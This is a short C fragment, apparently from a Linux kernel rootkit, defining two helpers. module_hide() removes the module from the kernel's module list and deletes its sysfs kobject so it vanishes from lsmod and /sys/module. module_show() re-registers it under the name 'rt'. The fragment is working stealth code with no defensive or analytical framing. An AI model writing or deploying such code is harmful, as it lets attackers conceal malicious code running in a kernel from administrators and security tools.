/* MODULE HELPERS */
void module_hide(void) {
    if(module_hidden) return;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}

void module_show(void) {
    int result;
    if(!module_hidden) return;
    list_add(&THIS_MODULE->list, module_previous);
    result=kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
    module_hidden = !module_hidden;
}
